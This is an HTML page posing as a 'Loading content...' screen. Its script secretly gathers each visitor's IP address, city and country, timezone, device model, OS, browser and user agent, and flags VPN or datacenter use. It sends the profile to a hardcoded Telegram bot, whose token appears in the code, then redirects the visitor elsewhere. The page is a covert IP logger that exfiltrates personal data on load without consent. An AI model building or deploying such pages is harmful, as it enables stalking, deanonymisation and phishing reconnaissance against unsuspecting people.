<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>body{margin:0;background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} p{font-size:1.2rem;}</style>
</head>
<body>
    <p>Loading content...</p>
    <script>
        // --- Configuration ---
        const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM'; 
        const CHAT_ID = '7863510010';     
        const REDIRECT_URL = 'https://www.misha/dad/image23689/august2024.com';
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // --- 1. Helper: VPN/Proxy Detection Logic ---
        function analyzeNetwork(ipData, systemTimezone) {
            let status = "False"; // Default assumption
            let details = "Residential/Standard";
            
            // A. Check for Hosting/VPN keywords in the ISP/Org name (Definite/High Prob)
            const isp = (ipData.org || '') + ' ' + (ipData.asn || '');
            const suspiciousKeywords = ['VPN', 'Proxy', 'Hosting', 'Cloud', 'Data Center', 'DigitalOcean', 'Amazon', 'Google Cloud', 'Microsoft', 'Oracle', 'M247', 'Leaseweb'];
            
            const isHosting = suspiciousKeywords.some(keyword => 
                isp.toLowerCase().includes(keyword.toLowerCase())
            );

            // B. Check for Timezone Mismatch (Probable)
            // If the IP says they are in Houston, but their system clock says Toronto
            let tzMismatch = false;
            if (ipData.timezone && systemTimezone) {
                if (ipData.timezone !== systemTimezone) {
                    tzMismatch = true;
                }
            }

            // C. Determine Final Verdict
            if (isHosting) {
                status = "DEFINITE (Hosting/Datacenter IP)";
                details = `ISP: ${ipData.org}`;
            } else if (tzMismatch) {
                status = "PROBABLE (Timezone Mismatch)";
                details = `IP TZ: ${ipData.timezone} vs Sys TZ: ${systemTimezone}`;
            }

            return { status, details };
        }

        // --- 2. Legacy Device Parser (For "K" issue) ---
        function getLegacyDeviceInfo(ua) {
            let os = 'Unknown OS', model = 'Unknown Model', manufacturer = 'Unknown', browser = 'Unknown', osVersion = 'N/A';

            if (ua.includes('Android')) {
                os = 'Android';
                const vMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
                if (vMatch) osVersion = vMatch[1];

                let mMatch = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
                if (mMatch && mMatch[2]) {
                    let seg = mMatch[2].trim();
                    if (seg.length <= 2) { 
                        mMatch = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
                        if (mMatch) seg = mMatch[1].trim();
                    }
                    model = seg.replace(/\s+Build\/.*/, '').trim();
                    if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) manufacturer = 'Samsung';
                    else if (model.includes('Pixel')) manufacturer = 'Google';
                    else if (model.length > 2 && model !== 'K') manufacturer = 'Android Device';
                }
            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
                os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
                manufacturer = 'Apple';
                model = ua.includes('iPad') ? 'iPad' : 'iPhone';
                const vMatch = ua.match(/OS\s(\d+_\d+)/);
                if (vMatch) osVersion = vMatch[1].replace(/_/g, '.');
            } else if (ua.includes('Windows')) { os = 'Windows'; model = 'PC'; }
            else if (ua.includes('Macintosh')) { os = 'macOS'; model = 'Mac'; }

            if (ua.includes('Chrome') && !ua.includes('Edg/')) browser = 'Chrome';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Firefox')) browser = 'Firefox';

            return { os, osVersion, model, manufacturer, browser };
        }

        // --- 3. Main Logic ---
        (async () => {
            // Get System Timezone for comparison
            const systemTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // A. Get IP/Network Data
            let ip = 'Unknown', loc = 'Unknown', networkAnalysis = { status: "Unknown", details: "N/A" };
            
            try {
                const r = await fetch('https://ipapi.co/json/');
                if (r.ok) {
                    const d = await r.json();
                    ip = d.ip;
                    loc = `${d.city}, ${d.region}, ${d.country_name}`;
                    // Analyze for VPN
                    networkAnalysis = analyzeNetwork(d, systemTimezone);
                }
            } catch (e) {
                // Fallback (Simple IP only, no rich data for VPN check)
                try {
                    const r2 = await fetch('https://api.ipify.org?format=json');
                    const d2 = await r2.json();
                    ip = d2.ip;
                } catch (e2) {}
            }

            // B. Get Device Info
            let dev = { os: 'Unknown', osVersion: '', model: 'Unknown', manufacturer: 'Unknown', browser: 'Unknown' };
            const ua = navigator.userAgent;

            try {
                if (navigator.userAgentData) {
                    const hints = await navigator.userAgentData.getHighEntropyValues(["platform","platformVersion","manufacturer","model"]);
                    dev.os = hints.platform || 'Unknown';
                    dev.osVersion = hints.platformVersion || '';
                    dev.manufacturer = hints.manufacturer || 'Unknown';
                    dev.model = hints.model || 'Unknown';
                    const b = navigator.userAgentData.brands.find(x => !x.brand.includes("Not"));
                    dev.browser = b ? b.brand : 'Unknown';
                } else {
                    dev = getLegacyDeviceInfo(ua);
                }
            } catch { dev = getLegacyDeviceInfo(ua); }

            // C. Build Message
            const msg = `
*--- NEW CONNECTION ANALYZED ---*

*NETWORK SECURITY*
*VPN/Proxy:* ${networkAnalysis.status}
*Details:* ${networkAnalysis.details}
*IP:* \`${ip}\`
*Location:* ${loc}
*System Timezone:* ${systemTimezone}

*DEVICE FINGERPRINT*
*Device:* ${dev.manufacturer} ${dev.model}
*OS:* ${dev.os} ${dev.osVersion}
*Browser:* ${dev.browser}

*META*
*Time:* ${new Date().toISOString()}
*User-Agent:* \`${ua}\`
            `.trim();

            // D. Send & Redirect
            fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
            }).finally(() => {
                setTimeout(() => window.location.replace(REDIRECT_URL), 800);
            });
        })();
    </script>
</body>
</html>
